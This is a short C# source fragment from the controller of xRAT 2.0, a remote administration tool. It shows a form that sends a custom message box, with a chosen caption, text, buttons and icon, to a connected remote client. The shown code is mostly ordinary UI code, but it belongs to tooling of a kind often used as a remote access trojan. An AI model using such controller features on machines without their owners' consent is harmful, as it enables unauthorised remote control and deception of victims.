    ...
    public partial class FrmShowMessagebox : Form
    {
        ...
        private void FrmShowMessagebox_Load(object sender, EventArgs e)
        {
            if (_connectClient != null)
                Text = string.Format("xRAT 2.0 - Show Messagebox [{0}:{1}]", _connectClient.EndPoint.Address,
                    _connectClient.EndPoint.Port);

            cmbMsgButtons.Items.AddRange(new[]
            {"AbortRetryIgnore", "OK", "OKCancel", "RetryCancel", "YesNo", "YesNoCancel"});
            cmbMsgButtons.SelectedIndex = 0;
            cmbMsgIcon.Items.AddRange(new[]
        ...
        {
            new ShowMessageBox(txtCaption.Text, txtText.Text, GetMessageBoxButton(cmbMsgButtons.SelectedIndex),
                GetMessageBoxIcon(cmbMsgIcon.SelectedIndex)).Execute(_connectClient);
            Close();
        }
